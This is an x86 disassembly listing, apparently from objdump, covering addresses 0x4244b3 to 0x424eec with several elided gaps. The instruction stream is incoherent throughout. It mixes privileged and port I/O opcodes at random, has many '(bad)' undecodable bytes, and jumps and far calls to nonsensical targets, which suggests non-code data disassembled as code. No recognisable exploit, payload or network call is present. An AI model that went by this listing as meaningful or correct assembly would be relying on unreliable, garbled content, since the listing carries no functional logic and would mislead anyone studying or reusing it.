  4244b3:	xor    BYTE PTR [eax+0xe56f91],dl
  4244b9:	mov    ebp,0xa9db5ed1
  4244be:	mov    edi,0x1a1af696
  4244c3:	mov    cs,WORD PTR [ebx+0x4cf28210]
  4244c9:	clc    
  4244ca:	sub    ch,cl
  4244cc:	mov    esi,DWORD PTR [ebp-0x68]
  4244cf:	loop   0x424532
  4244d1:	int3   
  4244d2:	iret   
  4244d3:	retf   
  4244d4:	push   eax
  4244d5:	mov    bl,0xde
  4244d7:	push   cs
  4244d8:	sti    
  4244d9:	pop    edi
  4244da:	js     0x4244b1
  4244dc:	and    DWORD PTR [ebx],0xffffff81
  4244df:	mov    cl,0x9
  4244e1:	sub    dl,cl
  4244e3:	and    al,0xc4
  4244e5:	(bad)  
  4244e6:	imul   esp,edx,0xfffffff2
  4244e9:	adc    BYTE PTR [ebx],dl
  4244eb:	jo     0x4244df
  4244ed:	shl    BYTE PTR [ebp+edx*8-0x6087cbb5],0xda
  4244f5:	or     BYTE PTR [esi+0x3f],ah
  4244f8:	data16 cmp BYTE PTR [ebp+0x773ca0f1],dh
  4244ff:	adc    ecx,DWORD PTR ds:0xd84e7378
  424505:	cmc    
  424506:	aas    
  424507:	adc    edi,ebx
  424509:	fmul   QWORD PTR [eax]
  42450b:	sub    BYTE PTR [edx-0x3d3cad24],al
  424511:	arpl   WORD PTR [esi-0x14],cx
  424514:	in     al,0x4e
  424516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424517:	jnp    0x42453e
  424519:	xor    DWORD PTR [ecx+0x10],edi
  42451c:	inc    ebp
  42451d:	pop    edi
  42451e:	jnp    0x424500
  424520:	fstp   QWORD PTR [edx]
  424522:	pop    ecx
  424523:	mov    ebx,0x8292bb7d
  424528:	xchg   edi,eax
  424529:	pop    ss
  42452a:	push   ebx
  42452b:	(bad)  
  42452d:	out    dx,al
  42452e:	(bad)  
  424530:	and    DWORD PTR [ebx],eax
  424532:	lahf   
  424533:	jge    0x42452b
  424535:	mov    ds:0x160a4556,eax
  42453a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42453b:	sbb    DWORD PTR [ebp+0x27e69750],0xfffffff6
  424542:	mov    ecx,0x5c13879d
  424547:	mov    ch,0xe9
  424549:	mov    ds:0xaf8a5c90,eax
  42454e:	cmp    DWORD PTR [ebx],esi
  424550:	aam    0xde
  424552:	push   ebx
  424553:	gs aad 0x12
  424556:	pop    ebx
  424557:	pop    eax
  424558:	repz inc edx
  42455a:	push   ebx
  42455b:	std    
  42455c:	inc    ebx
  42455d:	shr    BYTE PTR [esi+0x70],0x71
  424561:	jmp    0x42459e
  424563:	call   0x1ab1:0x69da8bf5
  42456a:	aam    0x32
  42456c:	dec    edx
  42456d:	and    al,0x0
	...
  4245d3:	add    BYTE PTR [eax],al
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x40],1
  4245e3:	(bad)  
  4245e4:	mov    ?,WORD PTR [edi+0x67]
  4245e7:	xchg   BYTE PTR [ecx],al
  4245e9:	add    BYTE PTR [eax],al
  4245eb:	add    DWORD PTR [eax],eax
  4245ed:	add    dl,ch
  4245ef:	cmc    
  4245f0:	or     eax,0x3520db6a
  4245f5:	mov    ah,0xc1
  4245f7:	outs   dx,DWORD PTR ds:[esi]
  4245f9:	or     ch,BYTE PTR [ebx+eiz*1]
  4245fc:	mov    WORD PTR [ecx+0x5d],fs
  4245ff:	pop    esi
  424600:	out    dx,al
  424601:	push   ebx
  424602:	aaa    
  424603:	push   cs
  424604:	xor    eax,0x767a149d
  424609:	sti    
  42460a:	hlt    
  42460b:	clc    
  42460c:	jb     0x4245d0
  42460e:	lock mov edi,0x97eb843
  424614:	and    dl,BYTE PTR [ebp+0x74ac935f]
  42461a:	loopne 0x4245f5
  42461c:	popa   
  42461d:	es add eax,0x44794298
  424623:	daa    
  424624:	icebp  
  424625:	call   0x96265254
  42462a:	daa    
  42462b:	je     0x4245dc
  42462d:	ins    DWORD PTR es:[edi],dx
  42462e:	xchg   ebp,eax
  42462f:	pop    ds
  424630:	push   ss
  424631:	xchg   ecx,eax
  424632:	loopne 0x424636
  424634:	in     eax,0x1d
  424636:	stos   DWORD PTR es:[edi],eax
  424637:	retf   
  424638:	cmp    eax,DWORD PTR [ebp-0x6720eed]
  42463e:	into   
  42463f:	fist   WORD PTR [edi]
  424641:	jg     0x42464c
  424643:	mov    cl,BYTE PTR [ecx]
  424645:	scas   al,BYTE PTR es:[edi]
  424646:	adc    DWORD PTR [eax+0x749dc8ae],ebx
  42464c:	xchg   esi,eax
  42464d:	push   esp
  42464e:	ret    0xb5e8
  424651:	arpl   sp,ax
  424653:	adc    DWORD PTR [esi+0x4ec1e845],edx
  424659:	sub    ch,BYTE PTR [ebp+0x3d33d221]
  42465f:	mov    dh,0x1a
  424661:	jp     0x4246a5
  424663:	jae    0x424673
  424665:	clc    
  424666:	pop    ss
  424667:	dec    ebp
  424668:	adc    al,BYTE PTR [edi]
  42466a:	sbb    BYTE PTR [ebp-0x3f],ch
  42466d:	pop    ebp
  42466e:	push   esi
  42466f:	out    dx,al
  424670:	or     DWORD PTR [edx],0x26
  424673:	fiadd  DWORD PTR [eax+0x25]
  424676:	out    dx,al
  424677:	pop    ss
  424678:	fstp   DWORD PTR [esi+0x4cc4fad7]
  42467e:	(bad)  
  42467f:	add    eax,0x19169d0e
  424684:	shl    BYTE PTR [edx-0x38673f41],0x19
  42468b:	fwait
  42468c:	adc    edi,DWORD PTR [edi-0x32]
  42468f:	aas    
  424690:	mov    ebp,DWORD PTR [edx]
  424692:	pop    es
  424693:	mov    WORD PTR [edi],fs
  424695:	cmp    eax,0xbe35440c
  42469a:	mov    ds:0xfceed279,al
  42469f:	in     al,0x35
  4246a1:	mov    DWORD PTR [esp+eiz*2+0x56b9cf5b],edi
  4246a8:	jp     0x42462e
  4246aa:	aam    0x37
  4246ac:	js     0x424654
  4246ae:	popf   
  4246af:	adc    DWORD PTR [ecx],0x708179ec
  4246b5:	jmp    0xe725a806
  4246ba:	mov    cl,bh
  4246bc:	fs (bad) 
  4246be:	call   0x533c3a06
  4246c3:	shr    DWORD PTR [esi+0x4fafbbfb],0xdd
  4246ca:	pop    ebx
  4246cb:	jmp    0x4246e0
  4246cd:	pop    ebx
  4246ce:	mul    DWORD PTR [eax+edi*1]
  4246d1:	and    al,BYTE PTR [edi+ebp*2]
  4246d4:	test   DWORD PTR [edx+esi*1],ebp
  4246d7:	mov    esi,0x30f3488a
  4246dc:	pushf  
  4246dd:	xchg   BYTE PTR [ebx],dl
  4246df:	add    DWORD PTR [eax-0x7ebe357b],esi
  4246e5:	(bad)  
  4246e6:	test   eax,0xa4852b43
  4246eb:	sti    
  4246ec:	jmp    0x42474f
	...
  424755:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [edx+0x677b39e0],ch
  424767:	xchg   DWORD PTR [ecx],eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    BYTE PTR [eax+esi*8],ch
  424770:	jmp    0x4247e1
  424772:	push   ecx
  424773:	adc    al,0x95
  424775:	dec    esi
  424776:	sbb    esp,edi
  424778:	lock dec ebp
  42477a:	push   es
  42477b:	out    dx,eax
  42477c:	sub    edx,ebx
  42477e:	cmp    eax,DWORD PTR [esi+esi*4]
  424781:	adc    edx,DWORD PTR es:[ebp-0x1d28cbc6]
  424788:	in     al,dx
  424789:	sub    al,0xfa
  42478b:	push   esp
  42478c:	ror    DWORD PTR es:[esi],cl
  42478f:	lods   eax,DWORD PTR ds:[esi]
  424790:	leave  
  424791:	pop    edx
  424792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424793:	jo     0x4247f6
  424795:	sbb    edi,esp
  424797:	and    bl,dh
  424799:	das    
  42479a:	dec    esp
  42479b:	and    dl,BYTE PTR [esi]
  42479d:	inc    esi
  42479e:	aad    0xfb
  4247a0:	out    dx,eax
  4247a1:	das    
  4247a2:	mov    esi,0xeff9196f
  4247a7:	loop   0x4247e1
  4247a9:	aas    
  4247aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247ab:	les    esi,FWORD PTR [edx]
  4247ad:	fcomp  DWORD PTR [edx+0x25]
  4247b0:	xchg   edi,eax
  4247b1:	jmp    0x424774
  4247b3:	fprem1 
  4247b5:	xchg   ecx,eax
  4247b6:	fs sbb ecx,edx
  4247b9:	mov    ebx,0x6c739411
  4247be:	push   edx
  4247bf:	xor    edx,DWORD PTR [eax]
  4247c1:	pop    ss
  4247c2:	fimul  WORD PTR [edx+0x6c]
  4247c5:	xor    DWORD PTR [edi-0x6a1e55de],ebp
  4247cb:	dec    edx
  4247cc:	pop    ss
  4247cd:	loop   0x4247a2
  4247cf:	cdq    
  4247d0:	and    eax,0x993936e4
  4247d5:	jo     0x42475d
  4247d7:	repnz or eax,0xf4833762
  4247dd:	xchg   esi,eax
  4247de:	pop    ebx
  4247df:	call   0x45b3:0x56d2a158
  4247e6:	adc    BYTE PTR [edx-0x1],0x4a
  4247ea:	mov    dl,0xb9
  4247ec:	std    
  4247ed:	in     eax,0xc2
  4247ef:	pop    ecx
  4247f0:	in     eax,0x36
  4247f2:	adc    eax,0xc6866178
  4247f7:	mov    DWORD PTR [edi+eiz*2+0x21],esp
  4247fb:	mov    cl,0xd7
  4247fd:	mov    al,ds:0x565cfe20
  424802:	imul   edi,DWORD PTR [esi],0x1f
  424805:	les    esp,FWORD PTR [ecx]
  424807:	repz dec edx
  424809:	shr    DWORD PTR [ebx],0xa8
  42480c:	mov    al,ds:0x3d9689b0
  424811:	mov    ebp,DWORD PTR [ebx-0x1f]
  424814:	inc    ecx
  424815:	xor    BYTE PTR [ebx],bh
  424817:	jb     0x42484b
  424819:	(bad)  
  42481a:	lds    eax,FWORD PTR [edx]
  42481c:	scas   al,BYTE PTR es:[edi]
  42481d:	or     BYTE PTR [ecx+eiz*2-0x56c32759],ah
  424824:	imul   esi,DWORD PTR fs:[edi+0x77],0xffffff92
  424829:	add    eax,0x9557714f
  42482e:	cmp    al,0x96
  424830:	mov    dh,dh
  424832:	push   cs
  424833:	stos   DWORD PTR es:[edi],eax
  424834:	pop    es
  424835:	in     eax,0xc7
  424837:	push   es
  424838:	ja     0x4247df
  42483a:	cmp    DWORD PTR [ebp+0x23f3d8b],0xfdfdf32a
  424844:	push   es
  424845:	xchg   esp,ebp
  424847:	test   eax,0xfb7bc61e
  42484c:	jg     0x424878
  42484e:	loopne 0x424896
  424850:	sub    esp,ebx
  424852:	pop    ss
  424853:	repnz push ss
  424855:	xchg   DWORD PTR [esi],ebx
  424857:	mov    bl,bl
  424859:	jbe    0x424848
  42485b:	sub    BYTE PTR ds:[ecx+0x124db9cc],dl
  424862:	scas   al,BYTE PTR es:[edi]
  424863:	ins    DWORD PTR es:[edi],dx
  424864:	dec    ebp
  424865:	inc    esp
  424866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424867:	inc    ebx
  424868:	aas    
  424869:	adc    edx,edi
  42486b:	push   eax
  42486c:	dec    ecx
  42486d:	test   al,0x0
	...
  4248d3:	add    BYTE PTR [eax],al
  4248d5:	add    BYTE PTR [edx],ah
  4248d7:	pop    eax
  4248d8:	test   bh,ch
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	test   al,0xe4
  4248e4:	push   ss
  4248e5:	jno    0x42494e
  4248e7:	mov    BYTE PTR [ecx],al
  4248e9:	add    BYTE PTR [eax],al
  4248eb:	add    DWORD PTR [eax],eax
  4248ed:	add    BYTE PTR [esi-0xae72544],al
  4248f3:	xchg   DWORD PTR [ecx],esi
  4248f5:	push   ebp
  4248f6:	push   esp
  4248f7:	adc    al,0x79
  4248f9:	out    0x4c,al
  4248fb:	and    eax,0x1642d9c4
  424900:	mov    al,0xcd
  424902:	cmp    eax,0x292ebef4
  424907:	js     0x4248c7
  424909:	sub    BYTE PTR [ecx-0x4b],dl
  42490c:	jb     0x424982
  42490e:	push   esi
  42490f:	jmp    0x62d6:0x1dd8adbf
  424916:	add    ah,BYTE PTR [eax]
  424918:	push   0xb989685a
  42491d:	pop    esi
  42491e:	jge    0x4248b9
  424920:	or     BYTE PTR [esi+edx*4+0x517e4fac],ch
  424927:	cwde   
  424928:	mov    ch,0x72
  42492a:	jmp    0xc284:0xb6129ffc
  424931:	sbb    eax,DWORD PTR [ebx+eiz*4-0x1c42fbce]
  424938:	dec    ebp
  424939:	popf   
  42493a:	fwait
  42493b:	xor    al,0xb9
  42493d:	es push eax
  42493f:	dec    edx
  424940:	iret   
  424941:	mov    BYTE PTR [ebx+0x78],bl
  424944:	fsubr  st(2),st
  424946:	sub    BYTE PTR [eax],bh
  424948:	inc    ebp
  424949:	jo     0x42499e
  42494b:	scas   al,BYTE PTR es:[edi]
  42494c:	sub    ebx,esp
  42494e:	mov    ah,0x12
  424950:	shr    BYTE PTR [eax+0x2c9aa688],0x50
  424957:	(bad)  
  424958:	repz aad 0x4b
  42495b:	in     al,dx
  42495c:	cld    
  42495d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42495e:	scas   eax,DWORD PTR es:[edi]
  42495f:	lahf   
  424960:	lea    edi,[ebp-0x35b7cef]
  424966:	(bad)  
  424967:	repz push ecx
  424969:	das    
  42496a:	shl    esi,1
  42496c:	ins    BYTE PTR es:[edi],dx
  42496d:	mov    ds:0xd9addf7e,eax
  424972:	xor    DWORD PTR [ebp+0x27],0x8d4ad242
  424979:	pushf  
  42497a:	sbb    ah,al
  42497c:	xchg   ebx,eax
  42497d:	push   ds
  42497e:	scas   al,BYTE PTR es:[edi]
  42497f:	(bad)
  424982:	cmc    
  424983:	outs   dx,DWORD PTR ds:[esi]
  424984:	out    0x98,al
  424986:	or     DWORD PTR [esi+0x70],0xfffffff1
  42498a:	xor    BYTE PTR [eax-0x6434745a],cl
  424990:	and    bl,BYTE PTR [eax-0x7e]
  424993:	retf   0x4aba
  424996:	sti    
  424997:	mov    cl,0x32
  424999:	(bad)  
  42499a:	pop    ecx
  42499b:	(bad)  [ecx]
  42499d:	push   ds
  42499e:	inc    esi
  42499f:	pushf  
  4249a0:	sti    
  4249a1:	sbb    DWORD PTR [ebp-0x4d816841],edi
  4249a7:	mov    bl,0x21
  4249a9:	mov    WORD PTR [edx],ss
  4249ab:	sbb    DWORD PTR [ecx],ecx
  4249ad:	ror    DWORD PTR [ebp+0x3e5d312a],0x63
  4249b4:	sahf   
  4249b5:	pop    ebx
  4249b6:	in     al,dx
  4249b7:	pop    eax
  4249b8:	push   esi
  4249b9:	aam    0x3a
  4249bb:	(bad)  
  4249bd:	bswap  edx
  4249bf:	sub    DWORD PTR [eax],0x5774ba4
  4249c5:	inc    ecx
  4249c6:	xchg   edi,eax
  4249c7:	hlt    
  4249c8:	stos   BYTE PTR es:[edi],al
  4249c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249ca:	sub    DWORD PTR [ecx-0x1a4683b0],0x23ed1488
  4249d4:	xor    al,0x90
  4249d6:	sub    DWORD PTR [edi+0x3a],ebx
  4249d9:	nop
  4249da:	sub    BYTE PTR [edi-0x6e],dh
  4249dd:	mov    bh,0x1f
  4249df:	lea    esi,[eax+ebx*1-0x2f]
  4249e3:	(bad)  
  4249e4:	dec    edi
  4249e5:	popa   
  4249e6:	jp     0x4249fa
  4249e8:	cld    
  4249e9:	sub    eax,0x93f98a2
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    al,BYTE PTR [ebp+0x3d]
  424a64:	mov    bl,0xf
  424a66:	mov    DWORD PTR [bx+di],eax
  424a69:	add    BYTE PTR [eax],al
  424a6b:	add    DWORD PTR [eax],eax
  424a6d:	add    BYTE PTR [esi+0x3c1924c2],ah
  424a73:	or     eax,0xcc777c79
  424a78:	lods   al,BYTE PTR ds:[esi]
  424a79:	(bad)  
  424a7a:	fsubr  st,st(6)
  424a7c:	jmp    0x424ae2
  424a7e:	les    eax,FWORD PTR cs:[ebx]
  424a81:	sbb    ebx,DWORD PTR [edi]
  424a83:	pop    edx
  424a84:	stos   BYTE PTR es:[edi],al
  424a85:	and    eax,0x849c2367
  424a8a:	mov    ah,0x48
  424a8c:	jge    0x424ac4
  424a8e:	loop   0x424ac7
  424a90:	stc    
  424a91:	sub    al,0xdd
  424a93:	jge    0x424a18
  424a95:	xor    eax,0x21dce692
  424a9a:	(bad)  
  424a9b:	shl    DWORD PTR [ecx+ecx*2],1
  424a9e:	enter  0x4d87,0x27
  424aa2:	dec    edx
  424aa3:	mov    ecx,0x362d0393
  424aa8:	mov    bh,0x42
  424aaa:	sti    
  424aab:	int    0x95
  424aad:	outs   dx,BYTE PTR ds:[esi]
  424aae:	add    dl,BYTE PTR [ecx+0x57d8cb82]
  424ab4:	mov    fs,eax
  424ab6:	fnsave [ebx]
  424ab8:	lea    ebx,[edi]
  424aba:	push   esp
  424abb:	call   0xa30d:0x9541bb5a
  424ac2:	inc    edi
  424ac3:	jle    0x424af2
  424ac5:	mov    bl,0xb6
  424ac7:	and    BYTE PTR fs:[edi],ch
  424aca:	or     eax,0xe8c1b4f3
  424acf:	(bad)  
  424ad0:	lods   al,BYTE PTR ds:[si]
  424ad2:	sti    
  424ad3:	or     eax,DWORD PTR [esi+0x3ffa540f]
  424ad9:	imul   esi,DWORD PTR [eax+0x782af90b],0xffffffc8
  424ae0:	into   
  424ae1:	es adc eax,0xd55cfa33
  424ae7:	clc    
  424ae8:	ins    BYTE PTR es:[edi],dx
  424ae9:	dec    esi
  424aea:	lods   al,BYTE PTR ds:[esi]
  424aeb:	push   ebp
  424aec:	xor    ebp,ebp
  424aee:	popa   
  424aef:	int3   
  424af0:	sbb    eax,0x5c58a250
  424af5:	jle    0x424ac6
  424af7:	mov    WORD PTR [edi],cs
  424af9:	ins    DWORD PTR es:[edi],dx
  424afa:	jmp    0x6e3abaaa
  424aff:	ins    DWORD PTR es:[edi],dx
  424b00:	outs   dx,BYTE PTR ds:[esi]
  424b01:	out    0x7e,eax
  424b03:	(bad)  
  424b04:	out    0x36,eax
  424b06:	dec    ebx
  424b07:	xor    ch,bl
  424b09:	push   ds
  424b0a:	ins    DWORD PTR es:[edi],dx
  424b0b:	sub    DWORD PTR [edi-0x6b],eax
  424b0e:	daa    
  424b0f:	mov    ?,ebx
  424b11:	cmp    edi,DWORD PTR [edi]
  424b13:	retf   0x3f18
  424b16:	push   ds
  424b17:	fsubp  st(1),st
  424b19:	cld    
  424b1a:	xor    cl,bl
  424b1c:	outs   dx,DWORD PTR ds:[esi]
  424b1d:	std    
  424b1e:	(bad)  
  424b1f:	out    dx,al
  424b20:	mov    WORD PTR ds:0x80360175,ds
  424b26:	sar    dl,0xeb
  424b29:	mov    dh,bh
  424b2b:	mov    cl,0x66
  424b2d:	cmc    
  424b2e:	and    eax,0xbca978b4
  424b33:	cmp    edi,esi
  424b35:	mov    es,eax
  424b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b38:	popa   
  424b39:	jg     0x424b69
  424b3b:	les    esi,FWORD PTR [esi-0x163bc9a8]
  424b41:	retf   
  424b42:	cmp    ebp,DWORD PTR [ecx-0x5f]
  424b45:	cmp    esp,esp
  424b47:	or     DWORD PTR [ebx],edx
  424b49:	xchg   esp,eax
  424b4a:	push   edi
  424b4b:	out    dx,eax
  424b4c:	cmp    bl,BYTE PTR [esi+0x6]
  424b4f:	mov    esp,DWORD PTR [ebp+0x3f]
  424b52:	and    BYTE PTR [ebx-0x25],0xb4
  424b56:	pop    esi
  424b57:	dec    ebx
  424b58:	out    dx,eax
  424b59:	popa   
  424b5a:	ret    
  424b5b:	data16 mov bl,0xf9
  424b5e:	and    eax,0xf631e1b2
  424b63:	inc    edi
  424b64:	xchg   BYTE PTR [edi+0x5b],cl
  424b67:	jg     0x424b68
  424b69:	sti    
  424b6a:	cli    
  424b6b:	mul    bh
  424b6d:	aad    0x0
	...
  424bd3:	add    BYTE PTR [eax],al
  424bd5:	add    BYTE PTR [esi],al
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	out    0x79,eax
  424be4:	xor    ah,0x67
  424be7:	mov    al,BYTE PTR [ecx]
  424be9:	add    BYTE PTR [eax],al
  424beb:	add    DWORD PTR [eax],eax
  424bed:	add    BYTE PTR [edi-0x5ad17877],ch
  424bf3:	sbb    al,0x5c
  424bf5:	adc    eax,DWORD PTR [ebx-0x7da5a312]
  424bfb:	scas   eax,DWORD PTR es:[edi]
  424bfc:	leave  
  424bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bfe:	sbb    al,ah
  424c00:	sar    BYTE PTR [ebx+0x45],0x29
  424c04:	mov    ds:0x6fd09a4f,al
  424c09:	neg    BYTE PTR [ebx]
  424c0b:	repz jg 0x424bcb
  424c0e:	inc    eax
  424c0f:	jo     0x424c74
  424c11:	inc    eax
  424c12:	sub    ebx,edx
  424c14:	repz in eax,0x80
  424c17:	dec    edi
  424c18:	into   
  424c19:	mov    ds:0x201bb1a3,eax
  424c1e:	std    
  424c1f:	fwait
  424c20:	jle    0x424c45
  424c22:	and    BYTE PTR [esi+0x28],ah
  424c25:	imul   edx,DWORD PTR [edx+0xe02824e],0xc12f43f3
  424c2f:	arpl   WORD PTR ds:0x12446a89,si
  424c35:	mov    ebx,0x4e46e070
  424c3a:	adc    dl,cl
  424c3c:	and    dh,cl
  424c3e:	int    0x1a
  424c40:	stos   BYTE PTR es:[edi],al
  424c41:	bsr    ecx,DWORD PTR [esi]
  424c44:	and    bh,BYTE PTR [edi+0x3ce11489]
  424c4a:	ret    
  424c4b:	ins    BYTE PTR es:[edi],dx
  424c4c:	stc    
  424c4d:	or     eax,0x3a7f5f21
  424c52:	idiv   edi
  424c54:	nop
  424c55:	leave  
  424c56:	adc    cl,0x65
  424c59:	popf   
  424c5a:	sbb    BYTE PTR [edx-0x64],ah
  424c5d:	fdiv   QWORD PTR [ebp-0x1e]
  424c60:	sub    BYTE PTR [edx+esi*1],dl
  424c63:	xor    al,0xb7
  424c65:	xchg   edi,eax
  424c66:	out    0xe1,al
  424c68:	dec    eax
  424c69:	mov    ds:0x3e6ca23c,eax
  424c6e:	(bad)  
  424c70:	cmp    bl,dh
  424c72:	jmp    0xb14aace6
  424c77:	pop    ds
  424c78:	(bad)  
  424c79:	test   eax,0x2f7b8c4f
  424c7e:	and    cl,dh
  424c80:	inc    eax
  424c81:	push   ds
  424c82:	fiadd  DWORD PTR [ebx+edx*8]
  424c85:	inc    eax
  424c86:	pushf  
  424c87:	ret    0xfe9d
  424c8a:	in     al,dx
  424c8b:	jp     0x424c82
  424c8d:	shr    DWORD PTR [esi+eax*2-0x36],1
  424c91:	(bad)  
  424c92:	cmp    DWORD PTR [esp+eax*4],ebp
  424c95:	xor    bh,dl
  424c97:	pop    esp
  424c98:	xchg   bl,cl
  424c9a:	shl    DWORD PTR [eax+0x1563de6a],0xad
  424ca1:	mov    edi,0x2f12a3e5
  424ca6:	test   BYTE PTR [edx],0x4c
  424ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424caa:	in     al,dx
  424cab:	test   DWORD PTR ds:0x706daa39,esi
  424cb1:	aam    0xff
  424cb3:	push   ebp
  424cb4:	push   0xffffffe8
  424cb6:	addr16 jo 0x424c78
  424cb9:	jb     0x424c53
  424cbb:	mov    edx,0xcb12b1ee
  424cc0:	inc    ebp
  424cc1:	cmp    eax,0xb695eab3
  424cc6:	stos   DWORD PTR es:[edi],eax
  424cc7:	pop    ecx
  424cc8:	xor    BYTE PTR [ecx],bl
  424cca:	icebp  
  424ccb:	out    dx,al
  424ccc:	shl    BYTE PTR [ecx],1
  424cce:	aaa    
  424ccf:	enter  0x946a,0x4d
  424cd3:	cmp    esi,0x3dda65e6
  424cd9:	mov    esi,0xd30c9743
  424cde:	and    eax,0x8a091afa
  424ce3:	jb     0x424d04
  424ce5:	ja     0x424d40
  424ce7:	cmp    eax,0x38c48fea
  424cec:	popa   
  424ced:	inc    eax
	...
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx-0x49d7ae58]
  424d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d65:	adc    DWORD PTR [edi-0x75],esp
  424d68:	add    DWORD PTR [eax],eax
  424d6a:	add    BYTE PTR [ecx],al
  424d6c:	add    BYTE PTR [eax],al
  424d6e:	mov    DWORD PTR [eax-0x44],edi
  424d71:	cwde   
  424d72:	out    0xf9,al
  424d74:	pusha  
  424d75:	mov    al,ds:0xa89c6f66
  424d7a:	jmp    0xb1f5c9ac
  424d7f:	gs push edx
  424d81:	sbb    bl,BYTE PTR [ecx+0xd6fc14]
  424d87:	mov    ebp,DWORD PTR ds:0xb86789c1
  424d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d8e:	leave  
  424d8f:	and    DWORD PTR [esi],edi
  424d91:	test   DWORD PTR [eax-0x2f8c2f04],ecx
  424d97:	add    DWORD PTR [ebp+esi*8-0x61],esp
  424d9b:	ins    BYTE PTR es:[edi],dx
  424d9c:	xchg   esi,eax
  424d9d:	test   al,0x1f
  424d9f:	fwait
  424da0:	lods   al,BYTE PTR ds:[esi]
  424da1:	push   eax
  424da2:	ss imul ebp,DWORD PTR fs:[ebx+0x1],0x7bef872a
  424dab:	cmp    BYTE PTR [esi],dh
  424dad:	add    eax,DWORD PTR [ebp-0x7653c377]
  424db3:	or     ah,BYTE PTR [ebp+0x34]
  424db6:	jo     0x424d83
  424db8:	xchg   ebp,eax
  424db9:	dec    ecx
  424dba:	inc    edx
  424dbb:	dec    ebx
  424dbc:	sbb    DWORD PTR [ecx+0x5feba501],esi
  424dc2:	jno    0x424d44
  424dc4:	neg    DWORD PTR [edi]
  424dc6:	mov    esp,0x84c2a8a3
  424dcb:	push   ebp
  424dcc:	mov    gs,ecx
  424dce:	fs jmp 0xf3dd:0x2a366de8
  424dd6:	pop    esi
  424dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dd8:	dec    edx
  424dd9:	mov    dl,0x91
  424ddb:	push   ebx
  424ddc:	std    
  424ddd:	jae    0x424dc6
  424ddf:	sub    al,0xb3
  424de1:	hlt    
  424de2:	sbb    DWORD PTR [ebx-0x3f],eax
  424de5:	xor    ebx,edx
  424de7:	or     dh,bh
  424de9:	aaa    
  424dea:	mov    ebx,0xaf6e25b4
  424def:	adc    ah,bh
  424df1:	jl     0x424d82
  424df3:	sbb    BYTE PTR [esi-0x54],ch
  424df6:	add    ecx,esp
  424df8:	aas    
  424df9:	xchg   esp,eax
  424dfa:	(bad)  
  424dfb:	and    esp,DWORD PTR [edx-0x7b5d011a]
  424e01:	cld    
  424e02:	mov    ch,0x34
  424e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e05:	call   0x72c174b5
  424e0a:	adc    eax,0xd3a61371
  424e0f:	aam    0x4f
  424e11:	and    esp,ebp
  424e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e14:	ja     0x424da8
  424e16:	popf   
  424e17:	leave  
  424e18:	mov    ebp,0xb9a9342c
  424e1d:	push   ebp
  424e1e:	xor    BYTE PTR [edi],dl
  424e20:	add    al,0xb9
  424e22:	sbb    eax,0xe716113c
  424e27:	(bad)  
  424e28:	sbb    dl,BYTE PTR [ecx+0x1f]
  424e2b:	icebp  
  424e2c:	iret   
  424e2d:	mov    bl,0x8
  424e2f:	sub    al,0xa6
  424e31:	loope  0x424e01
  424e33:	xlat   BYTE PTR ds:[ebx]
  424e34:	fwait
  424e35:	jns    0x424eb0
  424e37:	cmp    eax,DWORD PTR [ecx+0x71]
  424e3a:	aad    0x99
  424e3c:	pop    ds
  424e3d:	enter  0xdd38,0x44
  424e41:	cwde   
  424e42:	(bad)  
  424e43:	sbb    eax,0x149eadb1
  424e48:	stos   DWORD PTR es:[edi],eax
  424e49:	mov    ds:0x3b359ddd,eax
  424e4e:	hlt    
  424e4f:	lods   eax,DWORD PTR ds:[esi]
  424e50:	lods   eax,DWORD PTR ds:[esi]
  424e51:	xor    DWORD PTR [edi-0x3e],ecx
  424e54:	sar    DWORD PTR [esi+0x9],1
  424e57:	add    al,0xe5
  424e59:	pop    edx
  424e5a:	inc    esi
  424e5b:	push   esi
  424e5c:	scas   al,BYTE PTR es:[edi]
  424e5d:	dec    edi
  424e5e:	popa   
  424e5f:	xor    al,0x7d
  424e61:	sbb    eax,0x90aba95a
  424e66:	nop
  424e67:	or     BYTE PTR [ebx-0x7b],0x17
  424e6b:	jmp    0x424ee7
  424e6d:	test   DWORD PTR [eax],eax
	...
  424ed3:	add    BYTE PTR [eax],al
  424ed5:	add    BYTE PTR ds:0xf361d20c,bh
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424f37
  424ee3:	out    0xd5,al
  424ee5:	mov    ds:0x18c67,al
  424eea:	add    BYTE PTR [ecx],al
  424eec:	add    BYTE PTR [eax],al
